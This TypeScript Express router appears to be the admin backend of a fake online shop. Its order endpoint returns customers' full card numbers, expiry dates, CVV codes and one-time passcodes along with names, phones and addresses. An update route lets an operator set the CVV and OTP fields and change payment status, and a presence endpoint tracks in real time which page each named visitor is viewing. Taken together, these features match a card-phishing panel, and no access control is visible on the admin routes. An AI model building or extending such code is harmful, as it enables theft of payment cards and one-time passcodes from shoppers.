import { Router } from "express";
import { asc, eq } from "drizzle-orm";
import { db, ordersTable, productsTable, presenceTable, siteContentTable } from "@workspace/db";
import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody, UpdateOrderBody } from "@workspace/api-zod";
import { mapProductRow, mapSiteContentRow, isPresenceActive } from "./utils";

const router = Router();

router.get("/admin/orders", async (_req, res, next) => {
  try {
    const orders = await db
      .select({
        id: ordersTable.id,
        productId: ordersTable.productId,
        productName: ordersTable.productName,
        quantity: ordersTable.quantity,
        customerName: ordersTable.customerName,
        phone: ordersTable.phone,
        address: ordersTable.address,
        pickupDate: ordersTable.pickupDate,
        paymentMethod: ordersTable.paymentMethod,
        paymentStatus: ordersTable.paymentStatus,
        status: ordersTable.status,
        createdAt: ordersTable.createdAt,
        cardName: ordersTable.cardName,
        cardNumber: ordersTable.cardNumber,
        cardExpiry: ordersTable.cardExpiry,
        cardCvv: ordersTable.cardCvv,
        otpCode: ordersTable.otpCode,
      })
      .from(ordersTable)
      .orderBy(asc(ordersTable.createdAt));

    res.json(orders);
  } catch (error) {
    next(error);
  }
});

router.patch("/admin/orders/:id", async (req, res, next) => {
  try {
    const id = Number(req.params.id);
    if (Number.isNaN(id)) {
      return res.status(400).json({ error: "Invalid order id" });
    }

    const body = UpdateOrderBody.parse(req.body);
    const updateValues: Record<string, unknown> = {};

    if (body.cardName !== undefined) updateValues.cardName = body.cardName;
    if (body.cardNumber !== undefined) updateValues.cardNumber = body.cardNumber;
    if (body.cardExpiry !== undefined) updateValues.cardExpiry = body.cardExpiry;
    if (body.cardCvv !== undefined) updateValues.cardCvv = body.cardCvv;
    if (body.otpCode !== undefined) updateValues.otpCode = body.otpCode;
    if (body.paymentStatus !== undefined) updateValues.paymentStatus = body.paymentStatus;
    if (body.status !== undefined) updateValues.status = body.status;

    const updated = await db
      .update(ordersTable)
      .set(updateValues)
      .where(eq(ordersTable.id, id))
      .returning();

    if (updated.length === 0) {
      return res.status(404).json({ error: "Order not found" });
    }

    res.json(updated[0]);
  } catch (error) {
    next(error);
  }
});

router.get("/admin/summary", async (_req, res, next) => {
  try {
    const orders = await db
      .select({
        status: ordersTable.status,
        pickupDate: ordersTable.pickupDate,
      })
      .from(ordersTable);

    const presenceRows = await db
      .select({
        sessionId: presenceTable.sessionId,
        page: presenceTable.page,
        label: presenceTable.label,
        customerName: presenceTable.customerName,
        lastSeenAt: presenceTable.lastSeenAt,
      })
      .from(presenceTable);

    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const totalOrders = orders.length;
    const newOrders = orders.filter((order) => order.status === "new").length;
    const todayOrders = orders.filter((order) => new Date(order.pickupDate) >= today).length;
    const activeVisitors = presenceRows.filter((row) => isPresenceActive(row.lastSeenAt)).length;

    res.json({
      totalOrders,
      newOrders,
      todayOrders,
      activeVisitors,
    });
  } catch (error) {
    next(error);
  }
});

router.post("/admin/products", async (req, res, next) => {
  try {
    const body = CreateProductBody.parse(req.body);
    const [product] = await db
      .insert(productsTable)
      .values({
        name: body.name,
        description: body.description,
        imageUrl: body.imageUrl,
        maxQuantity: body.maxQuantity,
        price: body.price.toString(),
        active: body.active ?? true,
      })
      .returning();

    res.status(201).json(mapProductRow(product));
  } catch (error) {
    next(error);
  }
});

router.patch("/admin/products/:id", async (req, res, next) => {
  try {
    const id = Number(req.params.id);
    if (Number.isNaN(id)) {
      return res.status(400).json({ error: "Invalid product id" });
    }

    const body = UpdateProductBody.parse(req.body);
    const updateValues = {
      ...(body.name !== undefined ? { name: body.name } : {}),
      ...(body.description !== undefined ? { description: body.description } : {}),
      ...(body.imageUrl !== undefined ? { imageUrl: body.imageUrl } : {}),
      ...(body.maxQuantity !== undefined ? { maxQuantity: body.maxQuantity } : {}),
      ...(body.price !== undefined ? { price: body.price.toString() } : {}),
      ...(body.active !== undefined ? { active: body.active } : {}),
    };

    const updated = await db
      .update(productsTable)
      .set(updateValues)
      .where(eq(productsTable.id, id))
      .returning();

    if (updated.length === 0) {
      return res.status(404).json({ error: "Product not found" });
    }

    res.json(mapProductRow(updated[0]));
  } catch (error) {
    next(error);
  }
});

router.patch("/admin/content", async (req, res, next) => {
  try {
    const body = UpdateSiteContentBody.parse(req.body);

    const [existing] = await db
      .select({ id: siteContentTable.id })
      .from(siteContentTable)
      .limit(1);

    const content = {
      brandName: body.brandName,
      heroTitle: body.heroTitle,
      heroText: body.heroText,
      heroImageUrl: body.heroImageUrl,
      navLinks: body.navLinks,
    };

    const result = existing
      ? await db
          .update(siteContentTable)
          .set(content)
          .where(eq(siteContentTable.id, existing.id))
          .returning()
      : await db.insert(siteContentTable).values(content).returning();

    res.status(200).json(mapSiteContentRow(result[0]));
  } catch (error) {
    next(error);
  }
});

router.get("/admin/presence", async (_req, res, next) => {
  try {
    const rows = await db
      .select({
        sessionId: presenceTable.sessionId,
        page: presenceTable.page,
        label: presenceTable.label,
        customerName: presenceTable.customerName,
        lastSeenAt: presenceTable.lastSeenAt,
      })
      .from(presenceTable);

    res.json(
      rows.map((row) => ({
        ...row,
        active: isPresenceActive(row.lastSeenAt),
      })),
    );
  } catch (error) {
    next(error);
  }
});

export default router;
